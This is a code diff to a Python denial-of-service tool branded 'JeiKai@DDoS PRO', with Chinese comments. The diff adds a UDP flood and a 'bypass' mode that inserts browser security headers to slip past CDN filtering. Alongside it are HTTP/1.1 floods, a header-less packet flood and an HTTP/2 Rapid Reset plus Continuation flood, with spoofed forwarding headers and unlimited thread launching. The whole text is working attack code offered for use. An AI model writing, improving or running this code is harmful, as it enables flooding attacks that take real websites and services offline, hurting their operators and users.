@@ -10,7 +10,6 @@ from colorama import Fore
 from h2.config import H2Configuration
 from h2.connection import H2Connection
 
-cdn = False # 支援CDN的sec標頭
 brute = False # 最少數量header 不關閉socket連線
 th_re = False # 無限的開啟線程 (不會導致core dump 放心使用)
 th_list = []
@@ -55,14 +54,14 @@ def joinThreads(): #後台加入thread.join 確保美個線程工作都能完成
 def launchThreads(tp):  #在指定時間內 無上限開啟threads 
     global th_going     #反正有設定semaphore 不怕core dump
                         #全網獨家 首個引入這機制的腳本
-    if tp == 'http' or tp == 'pps' or tp == 'cc' or tp == 'rst':
+    if tp == 'http' or tp == 'pps' or tp == 'bypass' or tp == 'rst' or tp == 'udp':
         pass
     else:
         return
     print("OK")
     threading.Thread(target=joinThreads).start()
     while True:
-        if round(time.time()) < specs:
+        if round(time.time()) < specs: # 不直接放while迴圈判斷 因為效能會下降
             try:
                 if tp == "http" or tp == "bypass":
                     t = threading.Thread(target=run_http_flood, daemon=True)
@@ -70,6 +69,8 @@ def launchThreads(tp):  #在指定時間內 無上限開啟threads
                     t = threading.Thread(target=run_pps_flood, daemon=True)
                 elif tp == "rst":
                     t = threading.Thread(target=run_rst_stream, daemon=True)
+                elif tp =='udp':
+                    t = threading.Thread(target=run_udp_flood, daemon=True)
                 else:
                     continue
                 t.start()
@@ -85,11 +86,11 @@ def launchThreads(tp):  #在指定時間內 無上限開啟threads
 def forThreads(tp):  #傳統腳本使用的 以for迴圈啟動threads並呼叫攻擊
     global th_going  #這個方式相對穩定 80M的頻寬每秒大概能有4k~8k的請求 (full header)
     ths = []         #但沒法達到理論性能上限 要達上限還是推薦我上面的無上限threads + semaphore
-    if tp == 'http' or tp == 'pps' or tp == 'cc' or tp == 'rst':
+    if tp == 'http' or tp == 'pps' or tp == 'bypass' or tp == 'rst' or tp == 'udp':
         pass
     else:
         return
-    print("OK")
+    
     for _ in range(th_num):
         try:
             if tp == "http" or tp == "bypass":
@@ -98,6 +99,8 @@ def forThreads(tp):  #傳統腳本使用的 以for迴圈啟動threads並呼叫�
                 t = threading.Thread(target=run_pps_flood, daemon=True)
             elif tp == "rst":
                 t = threading.Thread(target=run_rst_stream, daemon=True)
+            elif tp =='udp':
+                t = threading.Thread(target=run_udp_flood, daemon=True)
             else:
                 continue
             t.start()
@@ -110,13 +113,21 @@ def forThreads(tp):  #傳統腳本使用的 以for迴圈啟動threads並呼叫�
 def showMethods(): #攻擊模式選擇
     clearScreen()
     print(f"\n{Fore.CYAN}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{Fore.RESET}")
-    print(f".http   | Layer7 Http plain Flood ")
-    print(f".rst    | Http2 Rapid Reset Flood")
-    print(f".pps    | Flood Target with no Headers")
-    print(f".bypass | Flood With Sec headers\n")
-
-    print(f"--brute | Keep socket always connected")
-    print(f"--re    | Keep launch new threads")
+    print(f"     ============================================= ")
+    print(f"    |            Layer7 Attack Methods            |")
+    print(f"     --------------------------------------------- ")
+    print(f"    |{Fore.GREEN}.http   {Fore.RESET}| {Fore.YELLOW}Layer7 Http plain Flood            {Fore.RESET}|")
+    print(f"    |{Fore.GREEN}.rst    {Fore.RESET}| {Fore.YELLOW}Http2 Rapid Reset Flood            {Fore.RESET}|")
+    print(f"    |{Fore.GREEN}.pps    {Fore.RESET}| {Fore.YELLOW}Flood Target with no Headers       {Fore.RESET}|")
+    print(f"    |{Fore.GREEN}.bypass {Fore.RESET}| {Fore.YELLOW}Flood With Sec headers             {Fore.RESET}|")
+    print(f"     --------------------------------------------- ")
+    print(f"    |            Layer4 Attack Methods            |")
+    print(f"     --------------------------------------------- ")
+    print(f"    |{Fore.GREEN}.udp    {Fore.RESET}| {Fore.YELLOW}Basic UDP Plain Flood              {Fore.RESET}|")
+    print(f"     ============================================= ")
+    print(f"    |{Fore.GREEN} --brute {Fore.RESET}| {Fore.YELLOW}Keep socket always connected      {Fore.RESET}|")
+    print(f"    |{Fore.GREEN} --re    {Fore.RESET}| {Fore.YELLOW}Keep launch new threads           {Fore.RESET}|")
+    print(f"     ============================================= ")
     print(f"{Fore.CYAN}:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{Fore.RESET}\n")
 
 
@@ -180,6 +191,7 @@ def headerHandle(): #封包標頭處理
     referer = f"Referer: {GetReferer()}\r\n"
     useragent = f"User-Agent: {random.choice(ua_list).strip()}\r\n"
     x_for = f"X-Forwarded-For: {fakeIP()}\r\nClient-IP: {fakeIP()}\r\nVia: {fakeIP()}\r\n"
+    cache = f"Cache-Control: no-cache, max-age=0\r\n"
     pri = f"Priority: u=1, i\r\n"
     origin = f"Origin: "
     if port == 443:
@@ -203,16 +215,30 @@ def headerHandle(): #封包標頭處理
     sec += f"Sec-Fetch-Site: same-origin\r\n"
     sec += f"Sec-Gpc: 1\r\n"
 
-    header = conn + accept + referer + useragent + x_for + pri + origin
+    header = conn + accept + referer + useragent + x_for + cache + pri + origin
     if brute: #如果啟用brute 就最大程度減少標頭 只留關鍵標頭
-        header = conn + useragent
-    if cdn: #如果啟用cdn 那就必須加入sec
+        header = conn + cache + useragent
+    if tp == 'bypass': #如果是bypass模式 那就必須加入sec
         header +=sec
     return header #回傳處理好的標頭
 
 
+def run_udp_flood():
+    payload = random._urandom(p_size)
+    with th_limit:
+        while th_going:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                for _ in range(rpc):
+                    s.sendto(payload, (host, port))
+            except:
+                pass
+        return 0
+    return 0
+
+
 def run_http_flood(): #HTTP1/1的洪流
-    with threading.Semaphore(th_num): # 騷操作 從semaphore去限制總執行序的數量 這樣你可以無限開啟執行序
+    with th_limit: # 騷操作 從semaphore去限制總執行序的數量 這樣你可以無限開啟執行序
         while th_going:
             header = headerHandle() # 呼叫一下標頭涵式處理
             header += '\r\n' #最後一定要加上\r\n才算是一個完整請求 輪子自己造 切記!
@@ -252,7 +278,7 @@ def run_http_flood(): #HTTP1/1的洪流
 def run_pps_flood(): # 測試用, 實用性很低 但是打圖表可以有很高的成績 (基本上很多botnet的http flood都是這樣 不塞header)
     # 這邊都跟上面相似 只是semaphore設定為800
     # 這算我試過最大效能的數字 不信自己改改就知道了
-    with threading.Semaphore(800): 
+    with th_limit: 
         while th_going:
             # 因為要測試pps的圖表都是接受任何封包的 所以沒其他標頭也可以
             # 留個connection告訴伺服器不要關閉socket就好
@@ -286,7 +312,7 @@ def run_pps_flood(): # 測試用, 實用性很低 但是打圖表可以有很高
 
 
 def run_rst_stream(): # HTTP/2 Rapid Reset mix Continuation-Flood (不一定有效 畢竟這兩個漏洞很久了)
-    with threading.Semaphore(th_num):
+    with th_limit:
         while th_going:
             try:
 
@@ -384,6 +410,11 @@ if __name__ =='__main__':
             cmd = str(input(f'{Fore.CYAN}╔═══[{Fore.YELLOW}JeiKai{Fore.RED}@{Fore.YELLOW}DDoS{Fore.CYAN}]-[{Fore.YELLOW}PRO{Fore.CYAN}]\n╚══> {Fore.WHITE}'))
             if cmd != "":
 
+                if "--brute" in cmd: # 啟用brute
+                    brute = True
+                if "--re" in cmd: # 啟用無限線程
+                    th_re = True
+
                 # 一般命令處理
                 if "?" in cmd or "help" in cmd:
                     showHelp() # 幫助訊息
@@ -399,27 +430,53 @@ if __name__ =='__main__':
                     sys.exit()
 
                 # 攻擊命令處理
-                if ".http" in cmd or ".pps" in cmd or ".rst" in cmd or ".bypass" in cmd:
+                if ".http" in cmd or ".pps" in cmd or ".rst" in cmd or ".bypass" in cmd or '.udp' in cmd:
+                    sct = False
                     argv = cmd.split(" ")
-                    if len(argv) >= 8:
+                    tp = argv[0][1:] # 攻擊模式
 
-                        if "--brute" in cmd: # 啟用brute
-                            brute = True
-                        if "--re" in cmd: # 啟用無限線程
-                            th_re = True
+                    if tp == "udp":
+                        if len(argv) == 7:
 
-                        # 參數設定
-                        tp = argv[0][1:] # 攻擊模式
-                        method = argv[1].upper() # 請求方式
-                        host = argv[2] # 主機(網站)位置
-                        port = int(argv[3]) # 端口
-                        path = argv[4] # 路徑
-                        th_num = int(argv[5]) # 線程數
-                        rpc = int(argv[6]) # 每個TCP連線的請求數, 對於一些有限制連接的網站來說 這個設置20~50最佳
-                        timeout = int(argv[7]) # 持續時間
-                        specs = round(time.time()) + timeout # 指定攻擊時間 (但好像沒效 我不知道為啥)
-                        th_going = True # 控制攻擊停止
+                            # 參數設定
+                            host = argv[1]
+                            port = int(argv[2])
+                            p_size = int(argv[3])
+                            th_num = int(argv[4])
+                            rpc = int(argv[5])
+                            timeout = int(argv[6])
+                            specs = round(time.time()) + timeout # 指定攻擊時間 (但好像沒效 我不知道為啥)
+                            th_going = True # 控制攻擊停止
+                            sct = True
 
+                        else:
+                            print(f"Use: {argv[0]} <IP> <PORT> <SIZE> <THREAD> <PPC> <TIME>")
+                            pass
+
+                    elif tp == 'rst' or tp == 'http' or tp == "pps" or tp == "bypass":
+                        if len(argv) >= 8:
+
+                            # 參數設定
+                            method = argv[1].upper() # 請求方式
+                            host = argv[2] # 主機(網站)位置
+                            port = int(argv[3]) # 端口
+                            path = argv[4] # 路徑
+                            th_num = int(argv[5]) # 線程數
+                            rpc = int(argv[6]) # 每個TCP連線的請求數, 對於一些有限制連接的網站來說 這個設置20~50最佳
+                            timeout = int(argv[7]) # 持續時間
+                            specs = round(time.time()) + timeout # 指定攻擊時間 (但好像沒效 我不知道為啥)
+                            th_going = True # 控制攻擊停止
+                            sct = True
+
+                        else:
+                            print(f"Use: {argv[0]} <method> <host> <port> <path> <threads> <rpc> <time>")
+                            #命令錯誤提示
+                            pass
+                    else:
+                        pass
+
+                    if sct:
+                        th_limit = threading.Semaphore(th_num)
                         if th_re: # 無限線程
                             md = f"High Performance"
                             threading.Thread(target=launchThreads, args=(tp,)).start() #啟動無上限threads
@@ -428,11 +485,8 @@ if __name__ =='__main__':
                             threading.Thread(target=forThreads, args=(tp,)).start() #啟動傳統for迴圈
 
                         print(f"\nAttack Sent , Runnung through {Fore.YELLOW}{th_num}{Fore.RESET} threads & {Fore.YELLOW}{rpc}{Fore.RESET} requests for connection")
-                        print(f"Target: {Fore.YELLOW}{host}{Fore.RESET}, Port: {Fore.YELLOW}{port}{Fore.RESET}, Path: {Fore.YELLOW}{path}{Fore.RESET}, Mode: {Fore.GREEN}{md}{Fore.RESET}")
-
+                        print(f"Target: {Fore.YELLOW}{host}{Fore.RESET}, Port: {Fore.YELLOW}{port}{Fore.RESET}, Mode: {Fore.GREEN}{md}{Fore.RESET}")
                     else:
-                        print(f"Use: {argv[0]} <method> <host> <port> <path> <threads> <rpc> <time>")
-                        #命令錯誤提示
                         pass
                 else:
                     pass
